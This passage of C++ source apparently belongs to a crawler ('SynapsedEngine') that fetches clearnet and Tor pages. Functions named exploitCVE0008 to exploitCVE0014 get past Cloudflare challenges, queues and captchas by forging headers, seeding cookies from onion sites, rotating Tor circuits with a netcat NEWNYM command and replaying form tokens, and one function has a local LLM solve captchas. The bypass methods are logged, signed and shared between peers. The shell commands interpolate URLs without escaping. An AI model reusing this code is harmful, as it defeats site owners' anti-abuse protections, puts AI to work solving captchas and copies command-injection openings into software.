        rayPos += 10;
        size_t rayEnd = html.find('"', rayPos);
        if (rayEnd != std::string::npos)
            rayId = html.substr(rayPos, rayEnd - rayPos);
    }

    size_t noncePos = html.find("nonce-");
    std::string nonce;
    if (noncePos != std::string::npos) {
        noncePos += 6;
        size_t nonceEnd = html.find_first_of("\"' ;", noncePos);
        if (nonceEnd != std::string::npos)
            nonce = html.substr(noncePos, nonceEnd - noncePos);
    }

    size_t actionPos = html.find("/cdn-cgi/challenge-platform");
    std::string challengeEndpoint;
    if (actionPos != std::string::npos) {
        size_t actionEnd = html.find_first_of("\"' >", actionPos);
        if (actionEnd != std::string::npos)
            challengeEndpoint = html.substr(actionPos, actionEnd - actionPos);
    }

    if (challengeEndpoint.empty()) return "";

    size_t slashP = url.find('/', url.find("://") + 3);
    std::string baseUrl = url.substr(0, slashP);
    std::string fullEndpoint = baseUrl + challengeEndpoint;

    std::string postData = "r=" + rayId + "&t=" +
        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::system_clock::now().time_since_epoch()).count());

    std::string cmd = "curl -s --max-time 20 -L "
        "-c " + dataDir_ + "/cf_clearance.txt -b " + dataDir_ + "/cf_clearance.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-H \"Sec-Fetch-Dest: document\" "
        "-H \"Sec-Fetch-Mode: navigate\" "
        "-H \"Origin: " + baseUrl + "\" "
        "-H \"Referer: " + url + "\" "
        "-d \"" + postData + "\" "
        "\"" + fullEndpoint + "\" 2>/dev/null";
    std::string challengeResp = execCmd(cmd);

    if (!challengeResp.empty()) {
        std::string fetchCmd = "curl -s --max-time 20 -L "
            "-b " + dataDir_ + "/cf_clearance.txt "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "\"" + url + "\" 2>/dev/null";
        std::string finalResp = execCmd(fetchCmd);
        if (!finalResp.empty() && finalResp.find("challenge-platform") == std::string::npos)
            return finalResp;
    }

    return "";
}

std::string SynapsedEngine::exploitCVE0008_TimingOracle(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    auto start = std::chrono::high_resolution_clock::now();
    std::string html;
    if (url.find(".onion") != std::string::npos) {
        html = fetchViaTor(url);
    } else {
        html = execCmd("curl -s --max-time 10 -L "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "\"" + url + "\" 2>/dev/null");
    }
    auto end = std::chrono::high_resolution_clock::now();
    double ttfb = std::chrono::duration<double, std::milli>(end - start).count();

    if (ttfb < 60 && html.size() < 15000) {
        return "TIMING:queue:" + std::to_string((int)ttfb);
    } else if (ttfb < 100 && html.find("challenge") != std::string::npos) {
        return "TIMING:pow:" + std::to_string((int)ttfb);
    } else if (ttfb < 300 && html.find("captcha") != std::string::npos) {
        return "TIMING:captcha:" + std::to_string((int)ttfb);
    } else if (ttfb >= 500 && html.size() > 5000) {
        return html;
    }

    return html;
}

std::string SynapsedEngine::exploitCVE0009_CookieConfusion(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    if (url.find(".onion") == std::string::npos) return "";

    std::string permissiveOnions[] = {
        "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/",
        "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/",
        "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/",
    };

    std::string cookieFile = dataDir_ + "/confusion_cookies.txt";

    for (const auto& seedUrl : permissiveOnions) {
        std::string seedCmd = "curl -s -k --max-time 30 " + socks5Arg() + " "
            "-c " + cookieFile + " -b " + cookieFile + " "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "\"" + seedUrl + "\" >/dev/null 2>&1";
        SYSTEM_IGNORE(seedCmd.c_str());
    }

    std::string cmd = "curl -s -k --max-time 45 " + socks5Arg() + " -L "
        "-b " + cookieFile + " -c " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() && result.find("captcha") == std::string::npos &&
        result.find("blocked") == std::string::npos) {
        return result;
    }

    return "";
}

std::string SynapsedEngine::exploitCVE0011_QueueRefreshBypass(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    bool isOnion = url.find(".onion") != std::string::npos;
    std::string cookieFile = dataDir_ + "/tor_cookies.txt";
    std::string socksArg = socks5Arg() + " ";

    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-c " + cookieFile + " -b " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string first = execCmd(cmd);
    if (first.empty()) return "";

    if (first.find("queue") == std::string::npos && first.find("Queue") == std::string::npos)
        return first;

    std::this_thread::sleep_for(std::chrono::seconds(2));

    std::string retry = execCmd(cmd);
    if (!retry.empty() && retry.find("queue") == std::string::npos &&
        retry.find("Queue") == std::string::npos) {
        return retry;
    }
    return retry;
}

std::string SynapsedEngine::exploitCVE0012_QueueCookieTTL(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    bool isOnion = url.find(".onion") != std::string::npos;
    std::string cookieFile = dataDir_ + "/queue_ttl_cookies.txt";
    std::string socksArg = socks5Arg() + " ";

    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-c " + cookieFile + " -b " + cookieFile + " "
        "-D - -H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string resp = execCmd(cmd);

    size_t maxAgeP = resp.find("Max-Age=");
    size_t refreshP = resp.find("Refresh:");
    if (maxAgeP == std::string::npos || refreshP == std::string::npos) return "";

    int maxAge = std::atoi(resp.c_str() + maxAgeP + 8);
    int refreshVal = std::atoi(resp.c_str() + refreshP + 8);

    if (maxAge <= refreshVal || refreshVal <= 0) return "";

    int waitSec = refreshVal + 1;
    std::this_thread::sleep_for(std::chrono::seconds(waitSec));

    std::string retry = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-b " + cookieFile + " -c " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(retry);

    if (!result.empty() && result.find("queue") == std::string::npos)
        return result;
    return "";
}

std::string SynapsedEngine::exploitCVE0013_QueueNewnym(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    if (url.find(".onion") == std::string::npos) return "";

    SYSTEM_IGNORE("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
           "nc 127.0.0.1 9151 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(5));

    std::string cmd = "curl -s -k --max-time 30 " + socks5Arg() + " -L "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() && result.find("queue") == std::string::npos &&
        result.find("Queue") == std::string::npos) {
        return result;
    }
    return "";
}

std::string SynapsedEngine::exploitCVE0014_CaptchaTokenReplay(
    const std::string& html, const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    auto it = captchaTokenCache_.find(url);
    std::string cachedToken;
    if (it != captchaTokenCache_.end()) {
        cachedToken = it->second;
    }

    std::string formAction = url;
    size_t formTag = html.find("<form");
    if (formTag != std::string::npos) {
        size_t actP = html.find("action=\"", formTag);
        if (actP != std::string::npos && actP < formTag + 500) {
            actP += 8;
            size_t actE = html.find('"', actP);
            if (actE != std::string::npos) {
                std::string act = html.substr(actP, actE - actP);
                if (!act.empty() && act[0] == '/') {
                    size_t slashP = url.find('/', url.find("://") + 3);
                    formAction = url.substr(0, slashP) + act;
                } else if (!act.empty() && act.find("http") == 0) {
                    formAction = act;
                }
            }
        }
    }

    std::string tokenField, tokenValue;
    std::string search = "type=\"hidden\"";
    size_t pos = 0;
    while ((pos = html.find(search, pos)) != std::string::npos) {
        size_t inputStart = html.rfind("<input", pos);
        if (inputStart == std::string::npos) { pos++; continue; }
        size_t inputEnd = html.find('>', pos);
        if (inputEnd == std::string::npos) { pos++; continue; }
        std::string inp = html.substr(inputStart, inputEnd - inputStart + 1);

        size_t nameP = inp.find("name=\"");
        size_t valP = inp.find("value=\"");
        if (nameP != std::string::npos && valP != std::string::npos) {
            size_t nq = inp.find('"', nameP + 6);
            std::string nm = inp.substr(nameP + 6, nq - nameP - 6);
            size_t vq = inp.find('"', valP + 7);
            std::string vl = inp.substr(valP + 7, vq - valP - 7);
            if (vl.size() > 20) {
                tokenField = nm;
                tokenValue = vl;
                captchaTokenCache_[url] = vl;
                break;
            }
        }
        pos = inputEnd;
    }

    if (tokenValue.empty() && !cachedToken.empty()) {
        tokenField = "csrf_token";
        tokenValue = cachedToken;
    }
    if (tokenValue.empty()) return "";

    bool isOnion = url.find(".onion") != std::string::npos;
    std::string socksArg = socks5Arg() + " ";
    std::string postData = tokenField + "=" + tokenValue;
    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-d \"" + postData + "\" "
        "\"" + formAction + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() && result.find("captcha") == std::string::npos &&
        result.find("invalid") == std::string::npos) {
        return result;
    }
    return "";
}

std::string SynapsedEngine::solveCaptchaViaLLM(const std::string& html,
    const std::string& imgPath, const std::string& url) const {
    if (!modelLoaded_) return "";

    std::string prompt;
    if (!imgPath.empty()) {
        prompt = "You are solving a CAPTCHA. The image has been saved to: " + imgPath +
                 "\nAnalyze the image and return ONLY the text/numbers shown in the CAPTCHA. "
                 "No explanation, just the answer.";
    } else {
        size_t capStart = html.find("captcha");
        if (capStart == std::string::npos) capStart = html.find("CAPTCHA");
        if (capStart == std::string::npos) return "";

        size_t contextStart = (capStart > 500) ? capStart - 500 : 0;
        size_t contextEnd = std::min(capStart + 2000, html.size());
        std::string context = html.substr(contextStart, contextEnd - contextStart);

        prompt = "Analyze this HTML fragment containing a CAPTCHA challenge. "
                 "Determine the correct answer. Return ONLY the answer, nothing else.\n\n" + context;
    }

    std::string tmpPrompt = dataDir_ + "/llm_captcha_prompt.txt";
    {
        std::ofstream f(tmpPrompt);
        f << prompt;
    }

    std::string answer;
    if (ensureLlamaLoaded()) {
        std::map<std::string, float> params;
        params["max_tokens"] = 32.f;
        params["temperature"] = 0.1f;
        std::lock_guard<std::mutex> llama(llamaMtx_);
        if (llamaEngine_) answer = llamaEngine_->runSyncText("desktop", prompt, params);
    }
    std::remove(tmpPrompt.c_str());
    while (!answer.empty() && (answer.back() == '\n' || answer.back() == '\r' || answer.back() == ' '))
        answer.pop_back();
    while (!answer.empty() && (answer.front() == ' ' || answer.front() == '"'))
        answer.erase(answer.begin());
    return answer;
}

void SynapsedEngine::loadExploitChain() const {
    std::string path = dataDir_ + "/exploit_chain.json";
    std::ifstream f(path);
    if (!f.good()) return;
    std::string content((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    size_t pos = 0;
    while ((pos = content.find("\"cveId\"", pos)) != std::string::npos) {
        ExploitIntel intel;
        auto getStr = [&](const std::string& key, size_t from) -> std::string {
            std::string search = "\"" + key + "\"";
            size_t p = content.find(search, from);
            if (p == std::string::npos || p > from + 500) return "";
            size_t q1 = content.find('"', p + search.size() + 1);
            if (q1 == std::string::npos) return "";
            size_t q2 = content.find('"', q1 + 1);
            if (q2 == std::string::npos) return "";
            return content.substr(q1 + 1, q2 - q1 - 1);
        };
        auto getInt = [&](const std::string& key, size_t from) -> int64_t {
            std::string search = "\"" + key + "\"";
            size_t p = content.find(search, from);
            if (p == std::string::npos || p > from + 500) return 0;
            size_t colon = content.find(':', p + search.size());
            if (colon == std::string::npos) return 0;
            return std::strtoll(content.c_str() + colon + 1, nullptr, 10);
        };
        size_t blockStart = content.rfind('{', pos);
        if (blockStart == std::string::npos) { pos++; continue; }
        intel.cveId = getStr("cveId", blockStart);
        intel.protectionType = getStr("protectionType", blockStart);
        intel.bypassMethod = getStr("bypassMethod", blockStart);
        intel.transport = getStr("transport", blockStart);
        intel.confidence = static_cast<double>(getInt("confidence", blockStart)) / 100.0;
        intel.discoveredBy = getStr("discoveredBy", blockStart);
        intel.timestamp = getInt("timestamp", blockStart);
        intel.successCount = static_cast<int>(getInt("successCount", blockStart));
        intel.failCount = static_cast<int>(getInt("failCount", blockStart));
        intel.signature = getStr("signature", blockStart);
        if (!intel.cveId.empty() && exploitChainIndex_.find(intel.cveId) == exploitChainIndex_.end()) {
            exploitChain_.push_back(intel);
            exploitChainIndex_[intel.cveId] = intel.timestamp;
        }
        pos++;
    }
}

void SynapsedEngine::persistExploitChain() const {
    std::string path = dataDir_ + "/exploit_chain.json";
    std::ofstream f(path);
    if (!f) return;
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    f << "[\n";
    for (size_t i = 0; i < exploitChain_.size(); i++) {
        const auto& e = exploitChain_[i];
        f << "  {\"cveId\":\"" << jsonEscape(e.cveId)
          << "\",\"protectionType\":\"" << jsonEscape(e.protectionType)
          << "\",\"bypassMethod\":\"" << jsonEscape(e.bypassMethod)
          << "\",\"transport\":\"" << jsonEscape(e.transport)
          << "\",\"confidence\":" << static_cast<int>(e.confidence * 100)
          << ",\"discoveredBy\":\"" << jsonEscape(e.discoveredBy)
          << "\",\"timestamp\":" << e.timestamp
          << ",\"successCount\":" << e.successCount
          << ",\"failCount\":" << e.failCount
          << ",\"signature\":\"" << jsonEscape(e.signature) << "\"}";
        if (i + 1 < exploitChain_.size()) f << ",";
        f << "\n";
    }
    f << "]\n";
}

void SynapsedEngine::publishExploit(const ExploitIntel& intel) const {
    {
        std::lock_guard<std::mutex> lock(exploitChainMtx_);
        auto it = exploitChainIndex_.find(intel.cveId);
        if (it != exploitChainIndex_.end()) {
            for (auto& existing : exploitChain_) {
                if (existing.cveId == intel.cveId) {
                    existing.successCount += intel.successCount;
                    existing.failCount += intel.failCount;
                    if (intel.confidence > existing.confidence) {
                        existing.confidence = intel.confidence;
                        existing.bypassMethod = intel.bypassMethod;
                    }
                    break;
                }
            }
        } else {
            exploitChain_.push_back(intel);
            exploitChainIndex_[intel.cveId] = intel.timestamp;
        }
    }
    persistExploitChain();

    std::string payload = "{\"type\":\"exploit_intel\",\"cveId\":\"" + jsonEscape(intel.cveId) +
        "\",\"protectionType\":\"" + jsonEscape(intel.protectionType) +
        "\",\"bypassMethod\":\"" + jsonEscape(intel.bypassMethod) +
        "\",\"transport\":\"" + jsonEscape(intel.transport) +
        "\",\"confidence\":" + std::to_string(static_cast<int>(intel.confidence * 100)) +
        ",\"discoveredBy\":\"" + jsonEscape(intel.discoveredBy) +
        "\",\"timestamp\":" + std::to_string(intel.timestamp) +
        ",\"successCount\":" + std::to_string(intel.successCount) +
        ",\"failCount\":" + std::to_string(intel.failCount) +
        ",\"signature\":\"" + jsonEscape(intel.signature) + "\"}";
    emitEvent("naan.exploit_intel", payload);
}

void SynapsedEngine::ingestExploit(const ExploitIntel& intel) const {
    if (intel.cveId.empty()) return;
    if (intel.confidence < 0.3) return;
    {
        std::lock_guard<std::mutex> lock(exploitChainMtx_);
        auto it = exploitChainIndex_.find(intel.cveId);
        if (it != exploitChainIndex_.end()) {
            for (auto& existing : exploitChain_) {
                if (existing.cveId == intel.cveId) {
                    existing.successCount += intel.successCount;
                    existing.failCount += intel.failCount;
                    if (intel.confidence > existing.confidence) {
                        existing.confidence = intel.confidence;
                        existing.bypassMethod = intel.bypassMethod;
                        existing.transport = intel.transport;
                    }
                    return;
                }
            }
        }
        exploitChain_.push_back(intel);
        exploitChainIndex_[intel.cveId] = intel.timestamp;
    }
    persistExploitChain();
}

SynapsedEngine::ExploitIntel SynapsedEngine::bestExploitFor(
    const std::string& protectionType) const {
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    ExploitIntel best;
    for (const auto& e : exploitChain_) {
        if (e.protectionType == protectionType && e.confidence > best.confidence) {
            best = e;
        }
    }
    return best;
}

std::string SynapsedEngine::exploitChainList(int offset, int limit) const {
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    std::ostringstream ss;
    ss << "[";
    int written = 0;
    for (int i = offset; i < static_cast<int>(exploitChain_.size()) && written < limit; i++) {
        const auto& e = exploitChain_[i];
        if (written > 0) ss << ",";
        ss << "{\"cveId\":\"" << jsonEscape(e.cveId)
           << "\",\"protectionType\":\"" << jsonEscape(e.protectionType)
           << "\",\"bypassMethod\":\"" << jsonEscape(e.bypassMethod)
           << "\",\"transport\":\"" << jsonEscape(e.transport)
           << "\",\"confidence\":" << static_cast<int>(e.confidence * 100)
           << ",\"discoveredBy\":\"" << jsonEscape(e.discoveredBy)
           << "\",\"timestamp\":" << e.timestamp
           << ",\"successCount\":" << e.successCount
           << ",\"failCount\":" << e.failCount
           << ",\"successRate\":" << (e.successCount + e.failCount > 0 ?
              static_cast<int>(100.0 * e.successCount / (e.successCount + e.failCount)) : 0)
           << "}";
        written++;
    }
    ss << "]";
    return ss.str();
}

std::string SynapsedEngine::exploitChainStats() const {
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    int total = static_cast<int>(exploitChain_.size());
    int critical = 0, high = 0;
    int totalSuccess = 0, totalFail = 0;
    for (const auto& e : exploitChain_) {
        if (e.confidence >= 0.9) critical++;
        else if (e.confidence >= 0.7) high++;
        totalSuccess += e.successCount;
        totalFail += e.failCount;
    }
    std::ostringstream ss;
    ss << "{\"total\":" << total
       << ",\"critical\":" << critical
       << ",\"high\":" << high
       << ",\"total_success\":" << totalSuccess
       << ",\"total_fail\":" << totalFail
       << ",\"success_rate\":" << (totalSuccess + totalFail > 0 ?
          static_cast<int>(100.0 * totalSuccess / (totalSuccess + totalFail)) : 0)
       << "}";
    return ss.str();
}

void SynapsedEngine::syncExploitChainFromPeers() const {
    loadExploitChain();
}

std::string SynapsedEngine::topicToUrl(const std::string& topic) const {
    if (topic.find("whistleblower") != std::string::npos ||
        topic.find("leak") != std::string::npos) {
        static const char* urls[] = {
            "http://secrdrop5wyphb5x.onion/",
            "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/",
        };
        std::mt19937 g(std::random_device{}());
        return urls[g() % 2];
    }
    if (topic.find("zero-day") != std::string::npos ||
        topic.find("exploit") != std::string::npos ||
        topic.find("vuln") != std::string::npos ||
        topic.find("cve") != std::string::npos) {
        static const char* urls[] = {
            "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=2024",
            "https://arxiv.org/list/cs.CR/recent",
            "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/news/technology",
        };
        std::mt19937 g(std::random_device{}());
        return urls[g() % 3];
    }
    if (topic.find("onion") != std::string::npos ||
        topic.find("darknet") != std::string::npos ||
        topic.find("tor") != std::string::npos) {
        std::string q = topic;
        for (auto& c : q) if (c == ' ') c = '+';
        static const std::string engines[] = {
            "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/search?query=",
            "http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/cgi-bin/omega/omega?P=",
            "http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/?q=",
            "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/?q=",
            "http://tordexpmg4xy32rfp4ovnz7zq5ujoejwq2u26uxxtkscgo5u3losmeid.onion/search?query=",
            "http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion/search?q=",
            "http://darkzqtmbdeauwq5mzcmgeeuhet42fhfjj4p5wbak3ofx2yqgecoeqyd.onion/search?query=",
            "http://3bbad7fauom4d6sgppalyqddsqbf5u5p56b5k5uk2zxsy3d6ey2jobad.onion/search?q=",
            "http://search7tdrcvri22rieiwgi5g46qnwsesvnubqav2xakhezv4hjzkkad.onion/result.php?search=",
            "http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/d/DarkSearch",
            "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/",
            "http://piratebayo3klnzokct3wt5yyxb2vpebbuyjl7m623iaxmqhsd52coid.onion/search.php?q=",
            "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/search?q=",
            "http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion/?q=",
            "http://phobosxilamwcg75xt22id7aywkzol6q6rfl2flipcqoc4e4ahima5id.onion/search?query=",
            "http://search7tdrcvri22rieiqgi5hmcb7ubxg2l5xebfyre2zdxqgtd4hqid.onion/search?q=",
        };
        std::mt19937 g(std::random_device{}());
        size_t idx = g() % 16;
        if (idx == 9 || idx == 10) return engines[idx];
        return engines[idx] + q;
    }
    if (topic.find("crypto") != std::string::npos)
        return "https://arxiv.org/list/cs.CR/recent";
    if (topic.find("AI") != std::string::npos)
        return "https://arxiv.org/list/cs.AI/recent";
    return "https://arxiv.org/list/cs.AI/recent";
}

std::vector<std::string> SynapsedEngine::extractTitles(const std::string& html) const {
    std::vector<std::string> titles;

    const std::string arxivMarker = "class=\"list-title";
    if (html.find(arxivMarker) != std::string::npos) {
        const std::string spanEnd = "</span>";
        const std::string divEnd = "</div>";
        size_t pos = 0;
        while (titles.size() < 20) {
            pos = html.find(arxivMarker, pos);
            if (pos == std::string::npos) break;
            size_t se = html.find(spanEnd, pos);
            if (se == std::string::npos) break;
            se += spanEnd.size();
            size_t de = html.find(divEnd, se);
            if (de == std::string::npos) break;
            std::string t = trim(html.substr(se, de - se));
            if (!t.empty() && t.size() > 5) titles.push_back(t);
            pos = de + divEnd.size();
        }
        if (!titles.empty()) return titles;
    }

    for (const auto& tag : {"<h1>", "<h2>", "<h1 "}) {
        std::string open = tag;
        std::string closeTag = (open[1] == 'h' && open[2] == '1') ? "</h1>" : "</h2>";
        size_t pos = 0;
        while (titles.size() < 20) {
            pos = html.find(open, pos);
            if (pos == std::string::npos) break;
            size_t gt = html.find('>', pos);
            if (gt == std::string::npos) break;
            size_t ce = html.find(closeTag, gt + 1);
            if (ce == std::string::npos) { ce = html.find("</h", gt + 1); }
            if (ce == std::string::npos) break;
            std::string raw = html.substr(gt + 1, ce - gt - 1);
            std::string clean;
            bool inTag = false;
            for (char c : raw) {
                if (c == '<') inTag = true;
                else if (c == '>') inTag = false;
                else if (!inTag) clean += c;
            }
            std::string t = trim(clean);
            if (!t.empty() && t.size() > 3) titles.push_back(t);
            pos = ce + 1;
        }
        if (!titles.empty()) return titles;
    }

    {
        size_t pos = 0;
        while (titles.size() < 20) {
            pos = html.find("<a href=\"/news/", pos);
            if (pos == std::string::npos) break;
            size_t gt = html.find('>', pos);
            if (gt == std::string::npos) break;
            size_t ce = html.find("</a>", gt + 1);
            if (ce == std::string::npos) break;
            std::string raw = html.substr(gt + 1, ce - gt - 1);
            std::string clean;
            bool inTag = false;
            for (char c : raw) {
                if (c == '<') inTag = true;
                else if (c == '>') inTag = false;
                else if (!inTag) clean += c;
            }
            std::string t = trim(clean);
            if (!t.empty() && t.size() > 10) titles.push_back(t);
            pos = ce + 4;
        }
        if (!titles.empty()) return titles;
    }

    {
        size_t ts = html.find("<title>");
        if (ts != std::string::npos) {
            size_t te = html.find("</title>", ts + 7);
            if (te != std::string::npos) {
                std::string t = trim(html.substr(ts + 7, te - ts - 7));
                if (!t.empty()) titles.push_back(t);
            }
        }
    }

    return titles;
}

std::string SynapsedEngine::sha256Hex(const std::string& data) const {
    std::string tmpFile = "" + dataDir_ + "/sha_" + std::to_string(nowMillis());
    {
        std::ofstream f(tmpFile, std::ios::binary);
        f.write(data.c_str(), data.size());
    }
    std::string result = execCmd("openssl dgst -sha256 -hex " + tmpFile + " 2>/dev/null");
    std::remove(tmpFile.c_str());
    size_t eq = result.rfind("= ");
    if (eq != std::string::npos) return trim(result.substr(eq + 2));
    return trim(result);
}

void SynapsedEngine::ensureSigningKey() const {
    std::string keyPath = dataDir_ + "/node_ed25519.pem";
    std::ifstream check(keyPath);
    if (check.good()) return;
    std::string cmd = "openssl genpkey -algorithm ed25519 -out " + keyPath + " 2>/dev/null";
    SYSTEM_IGNORE(cmd.c_str());
}

std::string SynapsedEngine::ed25519Sign(const std::string& data) const {
    ensureSigningKey();
    std::string keyPath = dataDir_ + "/node_ed25519.pem";
    std::string tmpIn = "" + dataDir_ + "/sign_in_" + std::to_string(nowMillis());
    std::string tmpOut = "" + dataDir_ + "/sign_out_" + std::to_string(nowMillis());
    {
        std::ofstream f(tmpIn, std::ios::binary);
        f.write(data.c_str(), data.size());
    }
    std::string cmd = "openssl pkeyutl -sign -rawin -inkey " + keyPath +
                      " -in " + tmpIn + " -out " + tmpOut + " 2>/dev/null";
    SYSTEM_IGNORE(cmd.c_str());
    std::ifstream sf(tmpOut, std::ios::binary);
    std::string sig;
    if (sf) {
        sig = std::string((std::istreambuf_iterator<char>(sf)),
                           std::istreambuf_iterator<char>());
    }
    std::remove(tmpIn.c_str());
    std::remove(tmpOut.c_str());
    std::string hex;
    hex.reserve(sig.size() * 2);
    for (unsigned char c : sig) {
        char tmp[3];
        snprintf(tmp, sizeof(tmp), "%02x", c);
        hex += tmp;
    }
    return hex;
}

void SynapsedEngine::persistDraft(const NaanDraft& d, const std::string& hash) const {
    std::string dir = dataDir_ + "/knowledge";
    std::string mkd = "mkdir -p " + dir;
    SYSTEM_IGNORE(mkd.c_str());
    std::string hash12 = hash.size() >= 12 ? hash.substr(0, 12) : hash;
    std::string fname = dir + "/draft_" + std::to_string(nowMillis()) + "_" + hash12 + ".json";
    std::ofstream f(fname);
    if (!f) return;
    BypassReport br;
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        br = lastBypass_;
    }
    f << "{\n"
      << "  \"title\": \"" << jsonEscape(d.title) << "\",\n"
      << "  \"topic\": \"" << jsonEscape(d.topic) << "\",\n"
      << "  \"status\": \"" << d.status << "\",\n"
      << "  \"ngt\": " << d.ngt << ",\n"
      << "  \"sha256\": \"" << hash << "\",\n"
      << "  \"bypass\": {\n"
      << "    \"cve\": \"" << jsonEscape(br.cveId) << "\",\n"
      << "    \"protection\": \"" << jsonEscape(br.protectionType) << "\",\n"
      << "    \"method\": \"" << jsonEscape(br.bypassMethod) << "\",\n"
      << "    \"transport\": \"" << jsonEscape(br.transport) << "\",\n"
      << "    \"ttfb_ms\": " << static_cast<int64_t>(br.ttfbMs) << ",\n"
      << "    \"bytes\": " << br.bytes << "\n"
      << "  },\n"
      << "  \"timestamp\": " << nowMillis() << "\n"
      << "}\n";
}

std::string SynapsedEngine::stripHtmlToText(const std::string& html) const {
    std::string out;
    out.reserve(html.size());
    bool inTag = false;
    bool inScript = false;
    bool inStyle = false;
    for (size_t i = 0; i < html.size(); i++) {
        if (!inTag && html[i] == '<') {
            inTag = true;
            std::string peek;
            for (size_t j = i + 1; j < html.size() && j < i + 12; j++) {
                peek += static_cast<char>(std::tolower(html[j]));
            }
            if (peek.find("script") == 0) inScript = true;
            else if (peek.find("/script") == 0) inScript = false;
            else if (peek.find("style") == 0) inStyle = true;
            else if (peek.find("/style") == 0) inStyle = false;
            continue;
        }
        if (inTag) {
            if (html[i] == '>') inTag = false;
            continue;
        }
        if (inScript || inStyle) continue;
        if (html[i] == '&') {
            size_t semi = html.find(';', i);
            if (semi != std::string::npos && semi < i + 10) {
                std::string ent = html.substr(i, semi - i + 1);
                if (ent == "&amp;") out += '&';
                else if (ent == "&lt;") out += '<';
                else if (ent == "&gt;") out += '>';
                else if (ent == "&quot;") out += '"';
                else if (ent == "&nbsp;") out += ' ';
                else if (ent == "&#39;") out += '\'';
                else out += ' ';
                i = semi;
                continue;
            }
        }
        out += html[i];
    }
    size_t maxLen = 50000;
    if (out.size() > maxLen) out.resize(maxLen);
    std::string cleaned;
    cleaned.reserve(out.size());
    int blanks = 0;
    for (char c : out) {
        if (c == '\n' || c == '\r') {
            blanks++;
            if (blanks <= 2) cleaned += '\n';
        } else if (c == '\t') {
            cleaned += ' ';
            blanks = 0;
        } else {
            blanks = 0;
            cleaned += c;
        }
    }
    return cleaned;
}

SynapsedEngine::HarvestPayload SynapsedEngine::extractAssets(
    const std::string& html, const std::string& baseUrl) const {
    HarvestPayload payload;
    payload.text = stripHtmlToText(html);

    auto resolveUrl = [&](const std::string& raw) -> std::string {
        if (raw.empty()) return "";
        if (raw.find("http://") == 0 || raw.find("https://") == 0) return raw;
        if (raw.find("//") == 0) return "http:" + raw;
        if (raw[0] == '/') {
            size_t slashP = baseUrl.find('/', baseUrl.find("://") + 3);
            if (slashP != std::string::npos) return baseUrl.substr(0, slashP) + raw;
            return baseUrl + raw;
        }
        size_t lastSlash = baseUrl.rfind('/');
        if (lastSlash != std::string::npos && lastSlash > 8)
            return baseUrl.substr(0, lastSlash + 1) + raw;
        return baseUrl + "/" + raw;
    };

    auto extractAttr = [](const std::string& tag, const std::string& attr) -> std::string {
        std::string search = attr + "=\"";
        size_t p = tag.find(search);
        if (p == std::string::npos) {
            search = attr + "='";
            p = tag.find(search);
        }
        if (p == std::string::npos) return "";
        p += search.size();
        char delim = search.back();
        size_t e = tag.find(delim, p);
        if (e == std::string::npos) return "";
        return tag.substr(p, e - p);
    };

    std::vector<std::string> urls;
    static const std::vector<std::string> fileExts = {
        ".pdf", ".doc", ".docx", ".zip", ".csv", ".txt",
        ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"
    };

